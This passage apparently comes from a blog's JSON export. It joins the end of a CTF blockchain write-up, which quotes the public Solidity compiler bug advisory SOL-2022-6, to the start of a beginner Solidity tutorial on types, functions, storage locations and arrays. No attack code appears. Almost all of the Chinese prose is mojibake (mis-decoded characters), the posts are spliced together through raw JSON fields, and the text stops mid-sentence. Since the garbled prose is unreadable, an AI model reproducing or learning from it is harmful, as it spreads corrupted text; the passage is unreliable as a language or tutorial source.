ç¼–è¯‘å™¨è‡ªèº«åŸå› å¯¼è‡´äº†è¿™ä¸ª bug, ä»è€Œä½¿å¾—ç¬¬ä¸€ä¸ªæˆå‘˜å˜é‡çš„å€¼æ¸…é›¶ï¼Œåœ¨ solidity0.8.16 åè¿™ä¸ªé—®é¢˜å¾—åˆ°äº†ä¿®å¤. è´´ä¸€ä¸‹ bug æè¿° \"uid\": \"SOL-2022-6\", \"name\": \"AbiReencodingHeadOverflowWithStaticArrayCleanup\", \"summary\": \"ABI-encoding a tuple with a statically-sized calldata array in the last component would corrupt 32 leading bytes of its first dynamically encoded component.\", \"description\": \"When ABI-encoding a statically-sized calldata array, the compiler always pads the data area to a multiple of 32-bytes and ensures that the padding bytes are zeroed. In some cases, this cleanup used to be performed by always writing exactly 32 bytes, regardless of how many needed to be zeroed. This was done with the assumption that the data that would eventually occupy the area past the end of the array had not yet been written, because the encoder processes tuple components in the order they were given. While this assumption is mostly true, there is an important corner case: dynamically encoded tuple components are stored separately from the statically-sized ones in an area called the *tail* of the encoding and the tail immediately follows the *head*, which is where the statically-sized components are placed. The aforementioned cleanup, if performed for the last component of the head would cross into the tail and overwrite up to 32 bytes of the first component stored there with zeros. The only array type for which the cleanup could actually result in an overwrite were arrays with ``uint256`` or ``bytes32`` as the base element type and in this case the size of the corrupted area was always exactly 32 bytes. The problem affected tuples at any nesting level. This included also structs, which are encoded as tuples in the ABI. Note also that lists of parameters and return values of functions, events and errors are encoded as tuples.\", \"introduced\": \"0.5.8\", \"fixed\": \"0.8.16\", \"severity\": \"medium\", \"conditions\": &#123; \"ABIEncoderV2\": true &#125; # ç»“è¯­ è‡³æ­¤ï¼Œè¿™ç¬¬å››é¢˜åŒºå—é“¾çš„è§£ç­”å°±åˆ°æ­¤ç»“æŸäº† è¯´ä¸€è¯´æ„Ÿå—å§ï¼Œæ¯æ¬¡åšåŒºå—é“¾çš„é¢˜ç›®éƒ½æ„Ÿè§‰ç‰¹åˆ«æœ‰æ„æ€ï¼Œå…¶å®æœ¬äººè¿‡å»æ˜¯å­¦ä¹ é€†å‘å·¥ç¨‹çš„ï¼Œä»Šå¹´æ‰å¼€å§‹æ¥è§¦åŒºå—é“¾ï¼Œè§£åŒºå—é“¾é¢˜ç›®çš„è¿‡ç¨‹è¯´å®è¯ï¼Œå’Œé€†å‘åˆ†æçœŸçš„å¥½åƒå“‡ï¼Œéƒ½æ˜¯ä¸€ä¸ªé€†å‘çš„è¿‡ç¨‹ï¼Œåˆ†æéœ€è¦æ»¡è¶³çš„æ¡ä»¶ï¼Œç„¶åè®¾æ³•ç¼–å†™åˆçº¦æ¥è®©æ¡ä»¶å¾—åˆ°æ»¡è¶³ï¼Œæœ€ç»ˆæ»¡è¶³æ‰€æœ‰éœ€è¦çš„æ¡ä»¶ä¹‹åè·å¾— flag , å¥½ç©å¥½ç©ï¼Œå˜¿å˜¿ (â—Ë‡âˆ€Ë‡â—)","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://oacia.dev/tags/CTF/"},{"name":"æ™ºèƒ½åˆçº¦","slug":"æ™ºèƒ½åˆçº¦","permalink":"https://oacia.dev/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"åŒºå—é“¾","slug":"åŒºå—é“¾","permalink":"https://oacia.dev/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"solidity","slug":"solidity","permalink":"https://oacia.dev/tags/solidity/"}]},{"title":"solidityè¯­è¨€å­¦ä¹ ","slug":"solidity-learning","date":"2022-10-20T00:19:57.000Z","updated":"2023-09-14T03:44:10.846Z","comments":true,"path":"solidity-learning/","link":"","permalink":"https://oacia.dev/solidity-learning/","excerpt":"","text":"# å‰è¨€ è¿‡å»æ›¾ç®€å•æ¥è§¦è¿‡ solidity, åˆçº¦çš„å†…å®¹åŸºæœ¬ä¸Šéƒ½æ˜¯å¯¹äºå‡½æ•°çš„è°ƒç”¨ï¼Œæ„Ÿè§‰å’Œè¿‡å»çœ‹ app çš„ java æºç å·®ä¸å¤šï¼Œéƒ½æ˜¯å¯¹äº‹ä»¶çš„è°ƒç”¨æ‰§è¡Œã€‚æ›¾ç»ä¹Ÿåœ¨ Ropsten æµ‹è¯•ç½‘ç»œä¸­è¿›è¡Œè¿‡å‡ æ¬¡æ™ºèƒ½åˆçº¦çš„äº¤æ˜“ï¼Œå¯¹äºäº¤æ˜“çš„è¿‡ç¨‹è¿˜æ˜¯å¤§è‡´æœ‰ä¸€äº›äº†è§£çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆä» solidity çš„è¿è¡Œç¯å¢ƒå¼€å§‹å§. # ç¯å¢ƒé…ç½® è¿™é‡Œæä¾›ä¸¤ç§é…ç½® solidity ç¯å¢ƒçš„æ–¹æ³• # é€šè¿‡ Remix åœ¨ç½‘é¡µæ‰§è¡Œ solidity (æ¨èï¼Œæ–¹ä¾¿å¿«æ·) Solidity å¼€å‘ç¯å¢ƒæ­å»º # é€šè¿‡ visual code å®‰è£… solidity solidity vscode ç¯å¢ƒé…ç½® 1ã€å®‰è£… vscodeã€nodeã€git ç­‰ï¼› 2ã€æ‰“å¼€ vscodeï¼Œæœç´¢æ‰©å±•ç»„å»º â€œsolidity + hardhatâ€ï¼Œå®‰è£…ï¼› 3ã€å®‰è£… prettier æ‰©å±•ç»„å»º 4ã€æ ¼å¼åŒ–ä»£ç è®¾ç½®ï¼š â€œæŸ¥çœ‹â€ - â€œå‘½ä»¤é¢æ¿â€ï¼Œè¾“å…¥ settingï¼Œç‚¹å‡» Open setting JSONï¼Œ å¢åŠ : \"[solidity]\": &#123; \"editor.defaultFormatter\": \"NomicFoundation.hardhat-solidity\" &#125;, \"[javascript]\":&#123; \"editor.defaultFormatter\": \"esbenp.prettier-vscode\" &#125; \"editor.formatOnSave\": trueè¿™æ ·æ¯æ¬¡ä¿å­˜æ—¶ï¼Œå°±è‡ªåŠ¨æ ¼å¼åŒ–ä»£ç ï¼› 5ã€â€œæŸ¥çœ‹â€ - â€œå‘½ä»¤é¢æ¿â€ï¼Œè¾“å…¥ settingï¼Œç‚¹å‡» Open User settings, # solidity çš„æ•°å€¼ç±»å‹ solidity çš„æ•°å€¼ç±»å‹æœ‰å››ç±»ï¼Œåˆ†åˆ«æ˜¯ å¸ƒå°”å‹ å’Œ c è¯­è¨€çš„å¸ƒå°”å‹ç±»ä¼¼ï¼Œsolidity çš„å¸ƒå°”ç±»å‹ ( bool ) ä¹Ÿæœ‰ true å’Œ false ä¸¤ä¸ªå€¼ // å¸ƒå°”å€¼ bool public _bool = true;è€Œå¸ƒå°”å‹çš„è¿ç®—ç¬¦åŒ…æ‹¬ !(é€»è¾‘é) &amp;&amp; (é€»è¾‘ä¸ï¼Œå³ and) || (é€»è¾‘éï¼Œå³ or) == (ç­‰äº) != (ä¸ç­‰äº) æ³¨æ„: &amp;&amp; å’Œ || è¿ç®—ç¬¦éµå¾ªçš„æ˜¯çŸ­è·¯è§„åˆ™ï¼Œä»å·¦åˆ°å³é¡ºåºå¼€å§‹è¿ç®—ï¼Œä¾‹å¦‚æœ‰ f(x)||g(y) , å¦‚æœ f(x) çš„å€¼æ˜¯ true , é‚£ä¹ˆ g(y) çš„å€¼å°†ä¼šä¸ä¼šè¢«è¿ç®—ï¼Œ f(x)&amp;&amp;g(y) ä¹Ÿæ˜¯åŒç†ï¼Œå¦‚æœ f(x) çš„å€¼æ˜¯ false , é‚£ä¹ˆ g(y) åŒæ ·ä¸ä¼šè¢«è®¡ç®—.(è¿™å¯ä»¥ç”¨æ¥èŠ‚çº¦ gas) æ•´å‹ // æ•´å‹ int public _int = -1; // æ•´æ•°ï¼ŒåŒ…æ‹¬è´Ÿæ•° uint public _uint = 1; // æ­£æ•´æ•° uint256 public _number = 20220330; // 256 ä½æ­£æ•´æ•°å¸¸ç”¨çš„æ•´å‹è¿ç®—ç¬¦åŒ…æ‹¬ï¼š æ¯”è¾ƒè¿ç®—ç¬¦ï¼ˆè¿”å›å¸ƒå°”å€¼ï¼‰ï¼š &lt;= ï¼Œ &lt; ï¼Œ == ï¼Œ != ï¼Œ &gt;= ï¼Œ &gt; ç®—æ•°è¿ç®—ç¬¦ï¼š + ï¼Œ ``ï¼Œ ä¸€å…ƒè¿ç®— + , - , * , / ï¼Œ % ï¼ˆå–ä½™ï¼‰ï¼Œ ** ï¼ˆå¹‚ï¼‰ è¿™é‡Œé™¤äº†å¹‚è¿ç®— ( ** ) å’Œ python çš„è¯­æ³•ç±»ä¼¼ï¼Œåˆ«çš„æ•´å‹è¿ç®—ç¬¦å¯ä»¥å‚è€ƒ c è¯­è¨€ åœ°å€ç±»å‹ // åœ°å€ address public _address = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71; address payable public _address1 = payable(_address); //payable addressï¼Œå¯ä»¥è½¬è´¦ã€æŸ¥ä½™é¢ // åœ°å€ç±»å‹çš„æˆå‘˜ uint256 public balance = _address1.balance; // balance of addressæ­¤å¤„çš„ payable å¯ä»¥é‡ç‚¹å…³æ³¨ä¸‹ï¼Œå› ä¸º payable address æ‹¥æœ‰ balance å’Œ transfer() ä¸¤ä¸ªæˆå‘˜ï¼Œç®€å•æ¥è¯´ï¼Œ banlance ç”¨æ¥æŸ¥è¯¢è´¦æˆ·çš„ä½™é¢ï¼Œè€Œ transfer() åˆ™å¯ä»¥å‘ä¸€ä¸ªåœ°å€å‘é€ä»¥å¤ª. å®šé•¿å­—èŠ‚æ•°ç»„ å­—èŠ‚æ•°ç»„ bytes åˆ†ä¸¤ç§ï¼Œä¸€ç§å®šé•¿ï¼ˆ byte , bytes8 , bytes32 ï¼‰ï¼Œå¦ä¸€ç§ä¸å®šé•¿ã€‚å®šé•¿çš„å±äºæ•°å€¼ç±»å‹ï¼Œä¸å®šé•¿çš„æ˜¯å¼•ç”¨ç±»å‹ã€‚ å®šé•¿ bytes å¯ä»¥å­˜ä¸€äº›æ•°æ®ï¼Œæ¶ˆè€— gas æ¯”è¾ƒå°‘ã€‚ // å›ºå®šé•¿åº¦çš„å­—èŠ‚æ•°ç»„ bytes32 public _byte32 = \"MiniSolidity\"; bytes1 public _byte = _byte32[0];MiniSolidity å˜é‡ä»¥å­—èŠ‚çš„æ–¹å¼å­˜å‚¨è¿›å˜é‡ _byte32 ï¼Œè½¬æ¢æˆ 16è¿›åˆ¶ ä¸ºï¼š 0x4d696e69536f6c69646974790000000000000000000000000000000000000000 _byte å˜é‡å­˜å‚¨ _byte32 çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œä¸º 0x4d ã€‚ æšä¸¾ç±»å‹ enum // ç”¨ enum å°† uint 0ï¼Œ 1ï¼Œ 2 è¡¨ç¤ºä¸º Buy, Hold, Sell enum ActionSet &#123; Buy, Hold, Sell &#125; // åˆ›å»º enum å˜é‡ action ActionSet action = ActionSet.Buy;# solidity çš„å‡½æ•°ç±»å‹ function &lt;function name> (&lt;parameter types>) &#123;internal|external|public|private&#125; [pure|view|payable] [returns (&lt;return types>)] function ç”¨æ¥å£°æ˜ä¸€ä¸ªå‡½æ•°ï¼Œå›ºå®šç”¨æ³•ï¼Œè¿™ä¸ python ç”¨ def æ¥å£°æ˜ä¸€ä¸ªå‡½æ•°æœ‰äº›ç±»ä¼¼ &lt;function name&gt; å‡½æ•°åï¼Œè‡ªå·±å®š (&lt;parameter types&gt;) ä¼ å…¥å‡½æ•°ä¸­çš„å‚æ•° &#123;internal|external|public|private&#125; è¯´æ˜å‡½æ•°çš„ç±»å‹ï¼Œæœªæ ‡æ˜é»˜è®¤å‡½æ•°ç±»å‹ä¸º internal . public : å†…éƒ¨å¤–éƒ¨å‡å¯è§ã€‚(ä¹Ÿå¯ç”¨äºä¿®é¥°çŠ¶æ€å˜é‡ï¼Œpublic å˜é‡ä¼šè‡ªåŠ¨ç”Ÿæˆ getter å‡½æ•°ï¼Œç”¨äºæŸ¥è¯¢æ•°å€¼). private : åªèƒ½ä»æœ¬åˆçº¦å†…éƒ¨è®¿é—®ï¼Œç»§æ‰¿çš„åˆçº¦ä¹Ÿä¸èƒ½ç”¨ï¼ˆä¹Ÿå¯ç”¨äºä¿®é¥°çŠ¶æ€å˜é‡ï¼‰ external : åªèƒ½ä»åˆçº¦å¤–éƒ¨è®¿é—®ï¼ˆä½†æ˜¯å¯ä»¥ç”¨ this.f() æ¥è°ƒç”¨ï¼Œ f æ˜¯å‡½æ•°åï¼‰ internal : åªèƒ½ä»åˆçº¦å†…éƒ¨è®¿é—®ï¼Œç»§æ‰¿çš„åˆçº¦å¯ä»¥ç”¨ï¼ˆä¹Ÿå¯ç”¨äºä¿®é¥°çŠ¶æ€å˜é‡) [pure|view|payable] å†³å®šå‡½æ•°æƒé™ / åŠŸèƒ½çš„å…³é”®å­—ã€‚å¸¦æœ‰ payable çš„å‡½æ•°å¯ä»¥ç”¨æ¥ç»™åˆçº¦è½¬å…¥ ETH, è€Œ pure å’Œ view , æ ¹æ® wtf å¤§ä½¬çš„è¯´æ³•ï¼Œæ˜¯å› ä¸º gas fee çš„åŸå› ï¼Œåˆçº¦çš„çŠ¶æ€å˜é‡å­˜å‚¨åœ¨é“¾ä¸Šï¼Œ gas fee å¾ˆè´µï¼Œå¦‚æœä¸æ”¹å˜é“¾ä¸ŠçŠ¶æ€ï¼Œå°±ä¸ç”¨ä»˜ gas ã€‚åŒ…å« pure è·Ÿ view å…³é”®å­—çš„å‡½æ•°æ˜¯ä¸æ”¹å†™é“¾ä¸ŠçŠ¶æ€çš„ï¼Œå› æ­¤ç”¨æˆ·ç›´æ¥è°ƒç”¨ä»–ä»¬æ˜¯ä¸éœ€è¦ä»˜ gas çš„ï¼ˆåˆçº¦ä¸­ pure / view å‡½æ•°è°ƒç”¨å®ƒä»¬åˆ™ä¼šæ”¹å†™é“¾ä¸ŠçŠ¶æ€ï¼Œéœ€è¦ä»˜ gasï¼‰ã€‚ åœ¨ä»¥å¤ªåŠä¸­ï¼Œä»¥ä¸‹è¯­å¥è¢«è§†ä¸ºä¿®æ”¹é“¾ä¸ŠçŠ¶æ€ï¼š å†™å…¥çŠ¶æ€å˜é‡ã€‚ é‡Šæ”¾äº‹ä»¶ã€‚ åˆ›å»ºå…¶ä»–åˆåŒã€‚ ä½¿ç”¨ selfdestruct . é€šè¿‡è°ƒç”¨å‘é€ä»¥å¤ªå¸ã€‚ è°ƒç”¨ä»»ä½•æœªæ ‡è®° view æˆ– pure çš„å‡½æ•°ã€‚ ä½¿ç”¨ä½çº§è°ƒç”¨ï¼ˆlow-level callsï¼‰ã€‚ ä½¿ç”¨åŒ…å«æŸäº›æ“ä½œç çš„å†…è”æ±‡ç¼–ã€‚ è¿™é‡Œæ€»ç»“ä¸€ä¸‹ä¸‰ä¸ªå…³é”®å­—çš„ä½œç”¨ pure ä¸èƒ½è¯»å†™ view èƒ½è¯»ä¸èƒ½å†™ payable å¯ä»¥ç”¨æ¥äº¤æ˜“ [returns ()] å‡½æ•°è¿”å›çš„å˜é‡ç±»å‹å’Œåç§°ã€‚ # solidity çš„å‡½æ•°è¾“å‡º solidity æ”¯æŒå‡½æ•°è¿”å›å¤šä¸ªå€¼ï¼Œsolidity å‡½æ•°è¾“å‡ºçš„å…³é”®å­—ä¸º return å’Œ returns returns åŠ åœ¨å‡½æ•°ååé¢ï¼Œç”¨äºå£°æ˜è¿”å›çš„å˜é‡ç±»å‹åŠå˜é‡åï¼› return ç”¨äºå‡½æ•°ä¸»ä½“ä¸­ï¼Œè¿”å›æŒ‡å®šçš„å˜é‡ã€‚ // è¿”å›å¤šä¸ªå˜é‡ function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123; return(1, true, [uint256(1),2,5]); &#125;å½“ç„¶ï¼Œsolidity ä¹Ÿå¯ä»¥ä½¿ç”¨å‘½åå¼è¿”å›ï¼Œç¤ºä¾‹å¦‚ä¸‹ // å‘½åå¼è¿”å› function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123; _number = 2; _bool = false; _array = [uint256(3),2,1]; //return (1, true, [uint256 (1),2,5]); ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ return è¿”å›å€¼ &#125;# solidity å˜é‡çš„æ•°æ®å­˜å‚¨ç±»å‹ solidity æ•°æ®å­˜å‚¨ä½ç½®æœ‰ä¸‰ç±»ï¼š storage ï¼Œ memory å’Œ calldata ã€‚ä¸åŒå­˜å‚¨ä½ç½®çš„ gas æˆæœ¬ä¸åŒã€‚ storage ç±»å‹çš„æ•°æ®å­˜åœ¨é“¾ä¸Šï¼Œç±»ä¼¼è®¡ç®—æœºçš„ç¡¬ç›˜ï¼Œæ¶ˆè€— gas å¤šï¼› memory å’Œ calldata ç±»å‹çš„ä¸´æ—¶å­˜åœ¨å†…å­˜é‡Œï¼Œæ¶ˆè€— gas å°‘ã€‚å¤§è‡´ç”¨æ³•ï¼š storage ï¼šåˆçº¦é‡Œçš„çŠ¶æ€å˜é‡é»˜è®¤éƒ½æ˜¯ storage ï¼Œå­˜å‚¨åœ¨é“¾ä¸Šã€‚ memory ï¼šå‡½æ•°é‡Œçš„å‚æ•°å’Œä¸´æ—¶å˜é‡ä¸€èˆ¬ç”¨ memory ï¼Œå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä¸ä¸Šé“¾ã€‚ calldata ï¼šå’Œ memory ç±»ä¼¼ï¼Œå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä¸ä¸Šé“¾ã€‚ä¸ memory çš„ä¸åŒç‚¹åœ¨äº calldata å˜é‡ä¸èƒ½ä¿®æ”¹ï¼ˆ immutable ï¼‰ï¼Œä¸€èˆ¬ç”¨äºå‡½æ•°çš„å‚æ•°ã€‚ä¾‹å­ï¼š function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata)&#123; // å‚æ•°ä¸º calldata æ•°ç»„ï¼Œä¸èƒ½è¢«ä¿®æ”¹ //_x [0] = 0 // è¿™æ ·ä¿®æ”¹ä¼šæŠ¥é”™ return(_x); &#125;# æ•°æ®ä½ç½®å’Œèµ‹å€¼è§„åˆ™ storage ï¼ˆåˆçº¦çš„çŠ¶æ€å˜é‡ï¼‰èµ‹å€¼ç»™æœ¬åœ° storage ï¼ˆå‡½æ•°é‡Œçš„ï¼‰æ—¶å€™ï¼Œä¼šåˆ›å»ºå¼•ç”¨ï¼Œæ”¹å˜æ–°å˜é‡ä¼šå½±å“åŸå˜é‡ã€‚ä¾‹å­ï¼š uint[] x = [1,2,3]; // çŠ¶æ€å˜é‡ï¼šæ•°ç»„ x function fStorage() public&#123; // å£°æ˜ä¸€ä¸ª storage çš„å˜é‡ xStorageï¼ŒæŒ‡å‘ xã€‚ä¿®æ”¹ xStorage ä¹Ÿä¼šå½±å“ x uint[] storage xStorage = x; xStorage[0] = 100; &#125; storage èµ‹å€¼ç»™ memory ï¼Œä¼šåˆ›å»ºç‹¬ç«‹çš„å‰¯æœ¬ï¼Œä¿®æ”¹å…¶ä¸­ä¸€ä¸ªä¸ä¼šå½±å“å¦ä¸€ä¸ªï¼›åä¹‹äº¦ç„¶ã€‚ä¾‹å­ï¼š uint[] x = [1,2,3]; // çŠ¶æ€å˜é‡ï¼šæ•°ç»„ x function fMemory() public view&#123; // å£°æ˜ä¸€ä¸ª Memory çš„å˜é‡ xMemoryï¼Œå¤åˆ¶ xã€‚ä¿®æ”¹ xMemory ä¸ä¼šå½±å“ x uint[] memory xMemory = x; xMemory[0] = 100; xMemory[1] = 200; uint[] memory xMemory2 = x; xMemory2[0] = 300; &#125; memory èµ‹å€¼ç»™ memory ï¼Œä¼šåˆ›å»ºå¼•ç”¨ï¼Œæ”¹å˜æ–°å˜é‡ä¼šå½±å“åŸå˜é‡ã€‚ function fMemory2() public returns(uint8[3] memory)&#123; uint8[3] memory x_tmp=[1,2,3]; uint8[3] memory xMemory = x_tmp; xMemory[0] = 100; xMemory[1] = 200; return x_tmp;&#125; å…¶ä»–æƒ…å†µï¼Œå˜é‡èµ‹å€¼ç»™ storage ï¼Œä¼šåˆ›å»ºç‹¬ç«‹çš„å¤æœ¬ï¼Œä¿®æ”¹å…¶ä¸­ä¸€ä¸ªä¸ä¼šå½±å“å¦ä¸€ä¸ªã€‚ function fStorage() public returns(uint)&#123; uint xMemory; xMemory=123456; x[0]=xMemory; xMemory=66666666; return x[0]; &#125;# å››ç§è§„åˆ™çš„æµ‹è¯•ä»£ç  //SPDX-License-Identifier:MITpragma solidity ^0.8.7;contract dataStorageRule&#123; uint[] x=[1,2,3]; // ç±»å‹ä¸º storage function RuleOne() public returns(uint)&#123; x=[1,2,3]; uint[] storage xstorage = x; xstorage[0]=111; return x[0]; &#125; function Ruletwo() public returns(uint,uint,uint)&#123; x=[1,2,3]; uint[] memory xstorage = x; xstorage[0]=111; xstorage[1]=222; xstorage[2]=333; return (x[0],x[1],x[2]); &#125; function Rulethree() public returns(uint8[3] memory)&#123; uint8[3] memory x_tmp=[1,2,3]; uint8[3] memory xMemory = x_tmp; xMemory[0] = 100; xMemory[1] = 200; return x_tmp; &#125; function Rulefour() public returns(uint)&#123; uint xMemory; xMemory=123456; x[0]=xMemory; xMemory=66666666; return x[0]; &#125;&#125; Ruleone Ruletwo Rulethree Rulefour # è¿™é‡Œç”¨ä¸€å¼ å…³ç³»å›¾æ¥æ€»ç»“ä¸€ä¸‹è¿™å››ç§è§„åˆ™ # å˜é‡çš„ä½œç”¨åŸŸ Solidity ä¸­å˜é‡æŒ‰ä½œç”¨åŸŸåˆ’åˆ†æœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯çŠ¶æ€å˜é‡ï¼ˆstate variableï¼‰ï¼Œå±€éƒ¨å˜é‡ï¼ˆlocal variableï¼‰å’Œå…¨å±€å˜é‡ (global variable) çŠ¶æ€å˜é‡ æŒ‡çš„æ˜¯å­˜å‚¨åœ¨é“¾ä¸Šçš„å˜é‡ï¼Œæ‰€æœ‰åˆçº¦å†…çš„å‡½æ•°éƒ½å¯ä»¥è®¿é—®ï¼Œå®šä¹‰åœ¨åˆçº¦å†…ï¼Œå‡½æ•°å¤–ï¼Œå¯ä»¥åœ¨å‡½æ•°å†…ä¿®æ”¹çŠ¶æ€å˜é‡çš„å€¼ï¼Œgas æ¶ˆè€—é«˜. contract Variables &#123; uint public x = 1; uint public y; string public z; å±€éƒ¨å˜é‡ å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œgas æ¶ˆè€—ä½ function bar() external pure returns(uint)&#123; uint xx = 1; uint yy = 3; uint zz = xx + yy; return(zz); &#125; å…¨å±€å˜é‡ å…¨å±€å˜é‡æ˜¯å…¨å±€èŒƒå›´å·¥ä½œçš„å˜é‡ï¼Œéƒ½æ˜¯ solidity é¢„ç•™å…³é”®å­—ã€‚ä»–ä»¬å¯ä»¥åœ¨å‡½æ•°å†…ä¸å£°æ˜ç›´æ¥ä½¿ç”¨ function global() external view returns(address, uint, bytes memory)&#123; address sender = msg.sender; uint blockNum = block.number; bytes memory data = msg.data; return(sender, blockNum, data); &#125;å¸¸ç”¨çš„å…¨å±€å˜é‡å…³é”®å­—: blockhash(uint blockNumber) returns (bytes32) ï¼šæŒ‡å®šåŒºå—çš„åŒºå—å“ˆå¸Œ â€”â€” ä»…å¯ç”¨äºæœ€æ–°çš„ 256 ä¸ªåŒºå—ä¸”ä¸åŒ…æ‹¬å½“å‰åŒºå—ï¼Œå¦åˆ™è¿”å› 0 ã€‚ block.basefee ( uint ): å½“å‰åŒºå—çš„åŸºç¡€è´¹ç”¨ï¼Œå‚è€ƒï¼š (EIP-3198 å’Œ EIP-1559) block.chainid ( uint ): å½“å‰é“¾ id block.coinbase ( address ): æŒ–å‡ºå½“å‰åŒºå—çš„çŸ¿å·¥åœ°å€ block.difficulty ( uint ): å½“å‰åŒºå—éš¾åº¦ block.gaslimit ( uint ): å½“å‰åŒºå— gas é™é¢ block.number ( uint ): å½“å‰åŒºå—å· block.timestamp ( uint ): è‡ª unix epoch èµ·å§‹å½“å‰åŒºå—ä»¥ç§’è®¡çš„æ—¶é—´æˆ³ gasleft() returns (uint256) ï¼šå‰©ä½™çš„ gas msg.data ( bytes ): å®Œæ•´çš„ calldata msg.sender ( address ): æ¶ˆæ¯å‘é€è€…ï¼ˆå½“å‰è°ƒç”¨ï¼‰ msg.sig ( bytes4 ): calldata çš„å‰ 4 å­—èŠ‚ï¼ˆä¹Ÿå°±æ˜¯å‡½æ•°æ ‡è¯†ç¬¦ï¼‰ msg.value ( uint ): éšæ¶ˆæ¯å‘é€çš„ wei çš„æ•°é‡ tx.gasprice ( uint ): äº¤æ˜“çš„ gas ä»·æ ¼ tx.origin ( address ): äº¤æ˜“å‘èµ·è€…ï¼ˆå®Œå…¨çš„è°ƒç”¨é“¾ï¼‰ # solidity çš„å¼•ç”¨ç±»å‹ å¼•ç”¨ç±»å‹ (Reference Type)ï¼šåŒ…æ‹¬æ•°ç»„ï¼ˆ array ï¼‰ï¼Œç»“æ„ä½“ï¼ˆ struct ï¼‰å’Œæ˜ å°„ï¼ˆ mapping ï¼‰ï¼Œè¿™ç±»å˜é‡å ç©ºé—´å¤§ï¼Œèµ‹å€¼æ—¶å€™ç›´æ¥ä¼ é€’åœ°å€ï¼ˆç±»ä¼¼æŒ‡é’ˆï¼‰ã€‚ç”±äºè¿™ç±»å˜é‡æ¯”è¾ƒå¤æ‚ï¼Œå ç”¨å­˜å‚¨ç©ºé—´å¤§ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨æ—¶å¿…é¡»è¦å£°æ˜æ•°æ®å­˜å‚¨çš„ä½ç½®ã€‚ # æ•°ç»„ array æ•°ç»„ï¼ˆ Array ï¼‰æ˜¯ solidity å¸¸ç”¨çš„ä¸€ç§å˜é‡ç±»å‹ï¼Œç”¨æ¥å­˜å‚¨ä¸€ç»„æ•°æ®ï¼ˆæ•´æ•°ï¼Œå­—èŠ‚ï¼Œåœ°å€ç­‰ç­‰ï¼‰ã€‚æ•°ç»„åˆ†ä¸ºå›ºå®šé•¿åº¦æ•°ç»„å’Œå¯å˜é•¿åº¦æ•°ç»„ä¸¤ç§ï¼š å›ºå®šé•¿åº¦æ•°ç»„ï¼šåœ¨å£°æ˜æ—¶æŒ‡å®šæ•°ç»„çš„é•¿åº¦ã€‚ç”¨ T[k] çš„æ ¼å¼å£°æ˜ï¼Œå…¶ä¸­ T æ˜¯å…ƒç´ çš„ç±»å‹ï¼Œ k æ˜¯é•¿åº¦ï¼Œä¾‹å¦‚ï¼š // å›ºå®šé•¿åº¦ Array uint[8] array1; bytes1[5] array2; address[100] array3;ãƒ»å¯å˜é•¿åº¦æ•°ç»„ï¼ˆåŠ¨æ€æ•°ç»„ï¼‰ï¼šåœ¨å£°æ˜æ—¶ä¸æŒ‡å®šæ•°ç»„çš„é•¿åº¦ã€‚ç”¨ T[] çš„æ ¼å¼å£°æ˜ï¼Œå…¶ä¸­ T æ˜¯å…ƒç´ çš„ç±»å‹ï¼Œä¾‹å¦‚ï¼ˆ **bytes æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯æ•°ç»„ï¼Œä½†æ˜¯ä¸ç”¨åŠ  [] **ï¼‰ï¼š // å¯å˜é•¿åº¦ Array uint[] array4; bytes1[] array5; address[] array6; bytes array7;# åˆ›å»ºæ•°ç»„çš„è§„åˆ™ å¯¹äº memory ä¿®é¥°çš„ åŠ¨æ€æ•°ç»„ ï¼Œå¯ä»¥ç”¨ new æ“ä½œç¬¦æ¥åˆ›å»ºï¼Œä½†æ˜¯å¿…é¡»å£°æ˜é•¿åº¦ï¼Œå¹¶ä¸”å£°æ˜åé•¿åº¦ä¸èƒ½æ”¹å˜ã€‚ä¾‹å­ï¼š //memory åŠ¨æ€æ•°ç»„ uint[] memory array8 = new uint[](5); bytes memory array9 = new bytes(9); æ•°ç»„å­—é¢å¸¸æ•° (Array Literals) æ˜¯å†™ä½œè¡¨è¾¾å¼å½¢å¼çš„æ•°ç»„ï¼Œç”¨æ–¹æ‹¬å·åŒ…ç€æ¥åˆå§‹åŒ– array çš„ä¸€ç§æ–¹å¼ï¼Œå¹¶ä¸”é‡Œé¢æ¯ä¸€ä¸ªå…ƒç´ çš„ type æ˜¯ä»¥ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºå‡†çš„ï¼Œä¾‹å¦‚ [1,2,3] é‡Œé¢æ‰€æœ‰çš„å…ƒç´ éƒ½æ˜¯ uint8 ç±»å‹ï¼Œå› ä¸ºåœ¨ solidity ä¸­å¦‚æœä¸€ä¸ªå€¼æ²¡æœ‰æŒ‡å®š type çš„è¯ï¼Œé»˜è®¤å°±æ˜¯æœ€å°å•ä½çš„è¯¥ typeï¼Œè¿™é‡Œ int çš„é»˜è®¤æœ€å°å•ä½ç±»å‹å°±æ˜¯ uint8ã€‚è€Œ [uint(1),2,3] é‡Œé¢çš„å…ƒç´ éƒ½æ˜¯ uint ç±»å‹ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªå…ƒç´ æŒ‡å®šäº†æ˜¯ uint ç±»å‹äº†ï¼Œæˆ‘ä»¬éƒ½ä»¥ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºå‡†ã€‚ å¦‚æœåˆ›å»ºçš„æ˜¯åŠ¨æ€æ•°ç»„ï¼Œä½ éœ€è¦ä¸€ä¸ªä¸€ä¸ªå…ƒç´ çš„èµ‹å€¼ã€‚ uint[] memory x = new uint[](3); x[0] = 1; x[1] = 3; x[2] = 4;# æ•°ç»„æˆå‘˜ length : æ•°ç»„æœ‰ä¸€ä¸ªåŒ…å«å…ƒç´ æ•°é‡çš„ length æˆå‘˜ï¼Œ memory 